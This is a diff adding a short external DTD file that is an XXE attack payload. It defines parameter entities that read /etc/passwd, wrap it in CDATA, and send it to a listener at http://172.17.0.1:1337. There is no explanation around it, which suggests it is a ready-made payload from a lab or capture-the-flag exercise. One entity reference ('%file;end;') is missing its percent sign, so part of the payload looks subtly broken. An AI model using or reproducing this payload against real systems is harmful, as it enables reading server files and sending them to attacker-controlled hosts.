@@ -1,0 +1,8 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
+%wrapper;
+<!ENTITY % http "http://172.17.0.1:1337/?">
+<!ENTITY % f "<!ENTITY send SYSTEM '%http;%start;%file;end;'>">
+%f;
